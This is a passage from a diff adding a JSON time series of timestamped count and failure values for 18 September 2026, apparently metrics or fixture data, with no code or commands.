+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:22:04.800000+00:00",
+      "count": 3,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:23:00+00:00",
+      "count": 4,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:23:55.200000+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:24:50.400000+00:00",
+      "count": 12,
+      "failures": 10
+    },
+    {
+      "t": "2026-09-18T02:25:45.600000+00:00",
+      "count": 4,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:26:40.800000+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:27:36+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:28:31.200000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:29:26.400000+00:00",
+      "count": 4,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:30:21.600000+00:00",
+      "count": 6,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:31:16.800000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:32:12+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:33:07.200000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:34:02.400000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:34:57.600000+00:00",
+      "count": 25,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:35:52.800000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:36:48+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:37:43.200000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:38:38.400000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:39:33.600000+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:40:28.800000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:41:24+00:00",
+      "count": 9,
+      "failures": 8
+    },
+    {
+      "t": "2026-09-18T02:42:19.200000+00:00",
+      "count": 7,
+      "failures": 6
+    },
+    {
+      "t": "2026-09-18T02:43:14.400000+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:44:09.600000+00:00",
+      "count": 1,
+      "failures": 1
+    },
+    {
+      "t": "2026-09-18T02:45:04.800000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:46:00+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:46:55.200000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:47:50.400000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:48:45.600000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:49:40.800000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:50:36+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:51:31.200000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:52:26.400000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:53:21.600000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:54:16.800000+00:00",
+      "count": 20,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:55:12+00:00",
+      "count": 2,
+      "failures": 0
+    }
+  ]
+}
